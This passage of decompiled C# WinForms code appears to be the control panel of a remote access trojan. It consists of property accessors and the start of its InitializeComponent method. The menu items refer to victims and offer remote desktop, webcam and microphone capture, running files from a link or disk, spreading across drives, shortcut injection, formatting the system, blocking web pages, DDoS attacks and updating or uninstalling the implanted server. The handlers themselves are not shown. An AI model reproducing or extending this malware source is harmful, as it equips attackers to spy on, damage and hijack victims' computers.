				flag = (this._Timer4 != null);
				if (flag)
				{
					this._Timer4.Tick += value2;
				}
			}
		}

		internal virtual System.Windows.Forms.Timer Timer5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer5_Tick);
				bool flag = this._Timer5 != null;
				if (flag)
				{
					this._Timer5.Tick -= value2;
				}
				this._Timer5 = value;
				flag = (this._Timer5 != null);
				if (flag)
				{
					this._Timer5.Tick += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader25 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader26 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader27
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader27;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader27 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader28
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader28;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader28 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader29
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader29;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader29 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader30
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader30;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader30 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader31
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader31;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader31 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader32
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader32;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader32 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader33
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader33;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader33 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader34
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader34;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader34 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader35
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader35;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader35 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader36
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader36;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader36 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader37
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader37;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader37 = value;
			}
		}

		internal virtual ImageList IMG2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMG2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMG2 = value;
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel6 = value;
			}
		}

		internal virtual ToolStripStatusLabel Tou
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Tou;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Tou = value;
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel8 = value;
			}
		}

		internal virtual ToolStripMenuItem UploadImageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadImageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadImageToolStripMenuItem_Click);
				bool flag = this._UploadImageToolStripMenuItem != null;
				if (flag)
				{
					this._UploadImageToolStripMenuItem.Click -= value2;
				}
				this._UploadImageToolStripMenuItem = value;
				flag = (this._UploadImageToolStripMenuItem != null);
				if (flag)
				{
					this._UploadImageToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem NoIPSiteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NoIPSiteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NoIPSiteToolStripMenuItem_Click);
				bool flag = this._NoIPSiteToolStripMenuItem != null;
				if (flag)
				{
					this._NoIPSiteToolStripMenuItem.Click -= value2;
				}
				this._NoIPSiteToolStripMenuItem = value;
				flag = (this._NoIPSiteToolStripMenuItem != null);
				if (flag)
				{
					this._NoIPSiteToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem NoIPToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NoIPToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NoIPToolStripMenuItem_Click);
				bool flag = this._NoIPToolStripMenuItem != null;
				if (flag)
				{
					this._NoIPToolStripMenuItem.Click -= value2;
				}
				this._NoIPToolStripMenuItem = value;
				flag = (this._NoIPToolStripMenuItem != null);
				if (flag)
				{
					this._NoIPToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem SiteEmailToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SiteEmailToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SiteEmailToolStripMenuItem_Click);
				bool flag = this._SiteEmailToolStripMenuItem != null;
				if (flag)
				{
					this._SiteEmailToolStripMenuItem.Click -= value2;
				}
				this._SiteEmailToolStripMenuItem = value;
				flag = (this._SiteEmailToolStripMenuItem != null);
				if (flag)
				{
					this._SiteEmailToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem PortSiteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PortSiteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PortSiteToolStripMenuItem_Click);
				bool flag = this._PortSiteToolStripMenuItem != null;
				if (flag)
				{
					this._PortSiteToolStripMenuItem.Click -= value2;
				}
				this._PortSiteToolStripMenuItem = value;
				flag = (this._PortSiteToolStripMenuItem != null);
				if (flag)
				{
					this._PortSiteToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem BackColorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._BackColorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._BackColorToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem RRRToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RRRToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RRRToolStripMenuItem_Click);
				bool flag = this._RRRToolStripMenuItem != null;
				if (flag)
				{
					this._RRRToolStripMenuItem.Click -= value2;
				}
				this._RRRToolStripMenuItem = value;
				flag = (this._RRRToolStripMenuItem != null);
				if (flag)
				{
					this._RRRToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RRRRToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RRRRToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RRRRToolStripMenuItem_Click);
				bool flag = this._RRRRToolStripMenuItem != null;
				if (flag)
				{
					this._RRRRToolStripMenuItem.Click -= value2;
				}
				this._RRRRToolStripMenuItem = value;
				flag = (this._RRRRToolStripMenuItem != null);
				if (flag)
				{
					this._RRRRToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem GridLinesToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GridLinesToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GridLinesToolStripMenuItem_Click);
				bool flag = this._GridLinesToolStripMenuItem != null;
				if (flag)
				{
					this._GridLinesToolStripMenuItem.Click -= value2;
				}
				this._GridLinesToolStripMenuItem = value;
				flag = (this._GridLinesToolStripMenuItem != null);
				if (flag)
				{
					this._GridLinesToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ColorLIToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorLIToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ColorLIToolStripMenuItem_Click);
				bool flag = this._ColorLIToolStripMenuItem != null;
				if (flag)
				{
					this._ColorLIToolStripMenuItem.Click -= value2;
				}
				this._ColorLIToolStripMenuItem = value;
				flag = (this._ColorLIToolStripMenuItem != null);
				if (flag)
				{
					this._ColorLIToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ColorLinesToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorLinesToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ColorLinesToolStripMenuItem_Click);
				bool flag = this._ColorLinesToolStripMenuItem != null;
				if (flag)
				{
					this._ColorLinesToolStripMenuItem.Click -= value2;
				}
				this._ColorLinesToolStripMenuItem = value;
				flag = (this._ColorLinesToolStripMenuItem != null);
				if (flag)
				{
					this._ColorLinesToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ExlamationMessageToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ExlamationMessageToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ExlamationMessageToolStripMenuItem1_Click);
				bool flag = this._ExlamationMessageToolStripMenuItem1 != null;
				if (flag)
				{
					this._ExlamationMessageToolStripMenuItem1.Click -= value2;
				}
				this._ExlamationMessageToolStripMenuItem1 = value;
				flag = (this._ExlamationMessageToolStripMenuItem1 != null);
				if (flag)
				{
					this._ExlamationMessageToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem GridLinesToolStripToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GridLinesToolStripToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GridLinesToolStripToolStripMenuItem_Click);
				bool flag = this._GridLinesToolStripToolStripMenuItem != null;
				if (flag)
				{
					this._GridLinesToolStripToolStripMenuItem.Click -= value2;
				}
				this._GridLinesToolStripToolStripMenuItem = value;
				flag = (this._GridLinesToolStripToolStripMenuItem != null);
				if (flag)
				{
					this._GridLinesToolStripToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RemoteDesktopToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteDesktopToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoteDesktopToolStripMenuItem1_Click);
				bool flag = this._RemoteDesktopToolStripMenuItem1 != null;
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem1.Click -= value2;
				}
				this._RemoteDesktopToolStripMenuItem1 = value;
				flag = (this._RemoteDesktopToolStripMenuItem1 != null);
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Frm_Main()
		{
			base.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
			base.Load += new EventHandler(this.Form1_Load);
			Frm_Main.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Main.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Main.__ENCList.Count == Frm_Main.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Main.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Main.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Main.__ENCList[num] = Frm_Main.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Main.__ENCList.RemoveRange(num, Frm_Main.__ENCList.Count - num);
						Frm_Main.__ENCList.Capacity = Frm_Main.__ENCList.Count;
					}
					Frm_Main.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Main));
			ListViewItem listViewItem = new ListViewItem(new string[]
			{
				"name",
				""
			}, "Semlabs-Web-Blog-User-male-white-red-brown.ico", Color.Empty, Color.Empty, new Font("Georgia", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0));
			ListViewItem listViewItem2 = new ListViewItem(new string[]
			{
				"host",
				""
			}, "001.png", Color.Empty, Color.Empty, new Font("Arial Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			ListViewItem listViewItem3 = new ListViewItem(new string[]
			{
				"Dir",
				""
			}, "03.png", Color.Empty, Color.Empty, new Font("Arial Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			ListViewItem listViewItem4 = new ListViewItem(new string[]
			{
				"exe",
				""
			}, "02.png", Color.Empty, Color.Empty, new Font("Cambria Math", 9f, FontStyle.Bold, GraphicsUnit.Point, 0));
			this.Timer1 = new System.Timers.Timer();
			this.BottomToolStripPanel = new ToolStripPanel();
			this.TopToolStripPanel = new ToolStripPanel();
			this.RightToolStripPanel = new ToolStripPanel();
			this.LeftToolStripPanel = new ToolStripPanel();
			this.ContentPanel = new ToolStripContentPanel();
			this.ContextMenuStrip1 = new ContextMenuStrip(this.components);
			this.RemoteDesktopToolStripMenuItem = new ToolStripMenuItem();
			this.RemoteCamToolStripMenuItem = new ToolStripMenuItem();
			this.RunFileToolStripMenuItem = new ToolStripMenuItem();
			this.FromLinkToolStripMenuItem = new ToolStripMenuItem();
			this.FromDiskToolStripMenuItem = new ToolStripMenuItem();
			this.ScriptToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator2 = new ToolStripSeparator();
			this.SpreadInHardDriveToolStripMenuItem1 = new ToolStripMenuItem();
			this.InjectToDesctopShortcutToolStripMenuItem = new ToolStripMenuItem();
			this.VictimInformationToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator4 = new ToolStripSeparator();
			this.ExtrasToolStripMenuItem = new ToolStripMenuItem();
			this.SendMsgboxToolStripMenuItem = new ToolStripMenuItem();
			this.ErrorMessageToolStripMenuItem = new ToolStripMenuItem();
			this.InformationMessageToolStripMenuItem = new ToolStripMenuItem();
			this.QuestionMessageToolStripMenuItem = new ToolStripMenuItem();
			this.ExlamationMessageToolStripMenuItem = new ToolStripMenuItem();
			this.TextToSpeechToolStripMenuItem = new ToolStripMenuItem();
			this.TaskbarToolStripMenuItem = new ToolStripMenuItem();
			this.HideToolStripMenuItem = new ToolStripMenuItem();
			this.ShowToolStripMenuItem1 = new ToolStripMenuItem();
			this.ComputerToolStripMenuItem1 = new ToolStripMenuItem();
			this.ShutDownToolStripMenuItem1 = new ToolStripMenuItem();
			this.RestartToolStripMenuItem1 = new ToolStripMenuItem();
			this.LogOffToolStripMenuItem = new ToolStripMenuItem();
			this.CDToolStripMenuItem = new ToolStripMenuItem();
			this.OpenCDToolStripMenuItem = new ToolStripMenuItem();
			this.CloseCDToolStripMenuItem = new ToolStripMenuItem();
			this.FormatSystemToolStripMenuItem = new ToolStripMenuItem();
			this.WebsiteToolStripMenuItem = new ToolStripMenuItem();
			this.OpenWebPageToolStripMenuItem1 = new ToolStripMenuItem();
			this.BlockWebpageToolStripMenuItem = new ToolStripMenuItem();
			this.DDosAttickToolStripMenuItem = new ToolStripMenuItem();
			this.OpenChatToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator3 = new ToolStripSeparator();
			this.ServerToolStripMenuItem = new ToolStripMenuItem();
			this.UpdateToolStripMenuItem = new ToolStripMenuItem();
			this.FromDISKToolStripMenuItem1 = new ToolStripMenuItem();
			this.FromLINKToolStripMenuItem1 = new ToolStripMenuItem();
			this.UninstallToolStripMenuItem = new ToolStripMenuItem();
			this.RestartToolStripMenuItem = new ToolStripMenuItem();
			this.CloseToolStripMenuItem = new ToolStripMenuItem();
			this.DisconnectToolStripMenuItem = new ToolStripMenuItem();
			this.RenameToolStripMenuItem = new ToolStripMenuItem();
			this.ChangeVictimColorToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator1 = new ToolStripSeparator();
			this.ToolStripMenuItem2 = new ToolStripMenuItem();
			this.CM3 = new ContextMenuStrip(this.components);
			this.HideMonitorToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator6 = new ToolStripSeparator();
			this.ShowMonitorToolStripMenuItem = new ToolStripMenuItem();
			this.im1 = new ImageList(this.components);
			this.IMG = new ImageList(this.components);
			this.Timer2 = new System.Windows.Forms.Timer(this.components);
			this.NotifyIcon1 = new NotifyIcon(this.components);
			this.P1 = new PictureBox();
			this.Panel1 = new Panel();
			this.Logs1 = new logs();
			this.ImageList1 = new ImageList(this.components);
			this.Panel2 = new Panel();
			this.Timer3 = new System.Windows.Forms.Timer(this.components);
			this.ecran = new System.Windows.Forms.Timer(this.components);
			this.ContextMenuStrip3 = new ContextMenuStrip(this.components);
			this.ManagerToolStripMenuItem = new ToolStripMenuItem();
			this.HhhhhToolStripMenuItem = new ToolStripMenuItem();
			this.HhhhhhToolStripMenuItem = new ToolStripMenuItem();
			this.YyyyyyyyToolStripMenuItem = new ToolStripMenuItem();
			this.HhhhhhhhToolStripMenuItem = new ToolStripMenuItem();
			this.GgggggggToolStripMenuItem = new ToolStripMenuItem();
			this.ServicesToolStripMenuItem = new ToolStripMenuItem();
			this.MensagemChatToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem3 = new ToolStripMenuItem();
			this.ExlamationMessageToolStripMenuItem1 = new ToolStripMenuItem();
			this.OpenChatToolStripMenuItem1 = new ToolStripMenuItem();
			this.NoIPSiteToolStripMenuItem = new ToolStripMenuItem();
			this.NoIPToolStripMenuItem = new ToolStripMenuItem();
			this.SiteEmailToolStripMenuItem = new ToolStripMenuItem();
			this.PortSiteToolStripMenuItem = new ToolStripMenuItem();
			this.LogsHackdToolStripMenuItem = new ToolStripMenuItem();
			this.UploadImageToolStripMenuItem = new ToolStripMenuItem();
			this.BackColorToolStripMenuItem = new ToolStripMenuItem();
			this.RRRToolStripMenuItem = new ToolStripMenuItem();
			this.RRRRToolStripMenuItem = new ToolStripMenuItem();
			this.GridLinesToolStripMenuItem = new ToolStripMenuItem();
			this.ColorLIToolStripMenuItem = new ToolStripMenuItem();
			this.ColorLinesToolStripMenuItem = new ToolStripMenuItem();
			this.GridLinesToolStripToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem8 = new ToolStripMenuItem();
			this.ToolStripMenuItem13 = new ToolStripMenuItem();
			this.ToolStripMenuItem14 = new ToolStripMenuItem();
			this.ToolStripMenuItem15 = new ToolStripMenuItem();
			this.ToolStripMenuItem16 = new ToolStripMenuItem();
			this.RemoteDesktopToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem17 = new ToolStripMenuItem();
			this.MicrophoneToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem18 = new ToolStripMenuItem();
			this.ToolStripMenuItem19 = new ToolStripMenuItem();
			this.ToolStripMenuItem20 = new ToolStripMenuItem();
			this.ToolStripMenuItem21 = new ToolStripMenuItem();
			this.ToolStripMenuItem22 = new ToolStripMenuItem();
			this.ToolStripMenuItem23 = new ToolStripMenuItem();
			this.ToolStripMenuItem24 = new ToolStripMenuItem();
			this.ToolStripMenuItem25 = new ToolStripMenuItem();
			this.ToolStripMenuItem26 = new ToolStripMenuItem();
			this.ToolStripMenuItem27 = new ToolStripMenuItem();
			this.ToolStripMenuItem28 = new ToolStripMenuItem();
			this.ToolStripMenuItem29 = new ToolStripMenuItem();
			this.YYToolStripMenuItem = new ToolStripMenuItem();
			this.ComputadorToolStripMenuItem1 = new ToolStripMenuItem();
			this.RefreshToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem30 = new ToolStripMenuItem();
			this.CDPlayerToolStripMenuItem1 = new ToolStripMenuItem();
			this.OpenCDToolStripMenuItem1 = new ToolStripMenuItem();
			this.GGGToolStripMenuItem = new ToolStripMenuItem();
			this.GGToolStripMenuItem = new ToolStripMenuItem();
			this.IndexFileToolStripMenuItem1 = new ToolStripMenuItem();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader3 = new ColumnHeader();
			this.ColumnHeader4 = new ColumnHeader();
			this.ColumnHeader5 = new ColumnHeader();
			this.ColumnHeader6 = new ColumnHeader();
			this.ColumnHeader7 = new ColumnHeader();
			this.ColumnHeader8 = new ColumnHeader();
			this.ColumnHeader9 = new ColumnHeader();
			this.ColumnHeader10 = new ColumnHeader();
			this.ColumnHeader11 = new ColumnHeader();
			this.ColumnHeader21 = new ColumnHeader();
			this.ColumnHeader22 = new ColumnHeader();
			this.ColumnHeader23 = new ColumnHeader();
			this.ColumnHeader24 = new ColumnHeader();
			this.Panel3 = new Panel();
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.TextBox3 = new TextBox();
			this.L1V = new L1V();
			this.ColumnHeader14 = new ColumnHeader();
			this.ColumnHeader15 = new ColumnHeader();
			this.ColumnHeader16 = new ColumnHeader();
			this.ColumnHeader17 = new ColumnHeader();
			this.ColumnHeader18 = new ColumnHeader();
			this.ColumnHeader19 = new ColumnHeader();
			this.ColumnHeader20 = new ColumnHeader();
			this.ColumnHeader25 = new ColumnHeader();
			this.ColumnHeader26 = new ColumnHeader();
			this.ColumnHeader27 = new ColumnHeader();
			this.ColumnHeader28 = new ColumnHeader();
			this.ColumnHeader29 = new ColumnHeader();
			this.ColumnHeader30 = new ColumnHeader();
			this.ColumnHeader31 = new ColumnHeader();
			this.ColumnHeader32 = new ColumnHeader();
			this.ColumnHeader33 = new ColumnHeader();
			this.ColumnHeader34 = new ColumnHeader();
			this.ColumnHeader35 = new ColumnHeader();
			this.ColumnHeader36 = new ColumnHeader();
			this.ColumnHeader37 = new ColumnHeader();
			this.IMG2 = new ImageList(this.components);
			this.StatusStrip1 = new StatusStrip();
			this.ToStael1 = new ToolStripStatusLabel();
			this.ToolStripStatusLabel3 = new ToolStripStatusLabel();
			this.ToolStripStatusLabel5 = new ToolStripStatusLabel();
			this.ToolStripStatusLabel4 = new ToolStripStatusLabel();
			this.conz = new ToolStripStatusLabel();
			this.upl = new ToolStripStatusLabel();
			this.dwn = new ToolStripStatusLabel();
			this.To2 = new ToolStripStatusLabel();
			this.Tool1 = new ToolStripStatusLabel();
			this.ToolStripStatusLabel2 = new ToolStripStatusLabel();
			this.ToolStripStatusLabel6 = new ToolStripStatusLabel();
			this.Tou = new ToolStripStatusLabel();
			this.ToolStripStatusLabel8 = new ToolStripStatusLabel();
			this.Timer4 = new System.Windows.Forms.Timer(this.components);
			this.Timer5 = new System.Windows.Forms.Timer(this.components);
			this.L2 = new LV();
			this.ColumnHeader12 = new ColumnHeader();
			this.ColumnHeader13 = new ColumnHeader();
			ColumnHeader columnHeader = new ColumnHeader();
			((ISupportInitialize)this.Timer1).BeginInit();
			this.ContextMenuStrip1.SuspendLayout();
			this.CM3.SuspendLayout();
			((ISupportInitialize)this.P1).BeginInit();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.ContextMenuStrip3.SuspendLayout();
			this.Panel3.SuspendLayout();
			this.StatusStrip1.SuspendLayout();
			this.SuspendLayout();
			columnHeader.DisplayIndex = 5;
			columnHeader.Text = "IP + PC";
			columnHeader.Width = 48;
			this.Timer1.Enabled = true;
			this.Timer1.SynchronizingObject = this;
			Control arg_ACA_0 = this.BottomToolStripPanel;
			Point location = new Point(0, 0);
			arg_ACA_0.Location = location;
			this.BottomToolStripPanel.Name = "BottomToolStripPanel";
			this.BottomToolStripPanel.Orientation = Orientation.Horizontal;
			ToolStripPanel arg_B02_0 = this.BottomToolStripPanel;
			Padding padding = new Padding(3, 0, 0, 0);
			arg_B02_0.RowMargin = padding;
			Control arg_B1A_0 = this.BottomToolStripPanel;
			Size size = new Size(0, 0);
			arg_B1A_0.Size = size;
			Control arg_B32_0 = this.TopToolStripPanel;
			location = new Point(0, 0);
			arg_B32_0.Location = location;
			this.TopToolStripPanel.Name = "TopToolStripPanel";
			this.TopToolStripPanel.Orientation = Orientation.Horizontal;
			ToolStripPanel arg_B6A_0 = this.TopToolStripPanel;
			padding = new Padding(3, 0, 0, 0);
			arg_B6A_0.RowMargin = padding;
			Control arg_B82_0 = this.TopToolStripPanel;
			size = new Size(0, 0);
			arg_B82_0.Size = size;
			Control arg_B9A_0 = this.RightToolStripPanel;
			location = new Point(0, 0);
			arg_B9A_0.Location = location;
			this.RightToolStripPanel.Name = "RightToolStripPanel";
			this.RightToolStripPanel.Orientation = Orientation.Horizontal;
			ToolStripPanel arg_BD2_0 = this.RightToolStripPanel;
			padding = new Padding(3, 0, 0, 0);
			arg_BD2_0.RowMargin = padding;
			Control arg_BEA_0 = this.RightToolStripPanel;
			size = new Size(0, 0);
			arg_BEA_0.Size = size;
			Control arg_C02_0 = this.LeftToolStripPanel;
			location = new Point(0, 0);
			arg_C02_0.Location = location;
			this.LeftToolStripPanel.Name = "LeftToolStripPanel";
			this.LeftToolStripPanel.Orientation = Orientation.Horizontal;
			ToolStripPanel arg_C3A_0 = this.LeftToolStripPanel;
			padding = new Padding(3, 0, 0, 0);
			arg_C3A_0.RowMargin = padding;
			Control arg_C52_0 = this.LeftToolStripPanel;
			size = new Size(0, 0);
			arg_C52_0.Size = size;
			this.ContentPanel.AutoScroll = true;
			Control arg_C7F_0 = this.ContentPanel;
			size = new Size(812, 255);
			arg_C7F_0.Size = size;
			this.ContextMenuStrip1.BackColor = Color.Black;
			this.ContextMenuStrip1.BackgroundImageLayout = ImageLayout.Stretch;
			this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.RemoteDesktopToolStripMenuItem,
